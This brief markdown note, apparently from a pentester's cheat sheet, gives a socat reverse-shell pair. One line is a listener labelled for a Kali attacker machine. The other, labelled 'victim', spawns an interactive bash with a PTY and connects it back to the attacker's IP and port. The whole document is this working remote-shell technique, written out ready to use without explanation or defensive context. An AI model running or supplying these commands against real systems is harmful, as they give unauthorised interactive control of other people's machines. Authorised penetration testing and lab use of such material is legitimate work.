# socat shells

```bash
# kali
socat FILE:`tty`,raw,echo=0 TCP-L:PORT 

# victim
socat EXEC:"bash -li",pty,stderr,sigint,setsid,sane TCP:IP:PORT
```
